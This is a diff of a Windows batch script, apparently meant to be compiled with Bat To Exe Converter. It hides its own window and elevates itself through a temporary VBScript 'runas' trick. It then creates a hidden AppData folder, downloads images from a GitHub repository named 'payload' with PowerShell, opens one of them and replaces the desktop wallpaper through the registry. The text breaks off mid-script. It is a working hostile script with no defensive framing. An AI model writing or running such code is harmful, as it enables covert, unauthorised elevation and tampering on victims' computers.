@@ -1,12 +1,72 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDFZcCCNP363A7sI+9TL7vOLrUwZaOQqdsHS2bvu
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpSI=
+::egkzugNsPRvcWATEpSI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDFZcCCNP363A7sI+9TL7vOLrUwZaMgyNorD39Q=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off 
+call getCmdPid
+call windowMode -pid %errorlevel% -mode hidden
+::--------------------------------------
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+::--------------------------------------
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+::--------------------------------------
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+::--------------------------------------
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+::--------------------------------------
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+::--------------------------------------
 cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir Anon
 attrib +h Anon /s /d
 ::--------------------------------------
 Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/fun.jpg' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
-Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\ss.jpg"
+Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile %TEMP%\ss.jpg"
 Powershell start "C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
 ::--------------------------------------
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%USERNAME%\AppData\Local\Anon\ss.jpg /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %TEMP%\ss.jpg /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 ::--------------------------------------
 set pop=%systemroot%
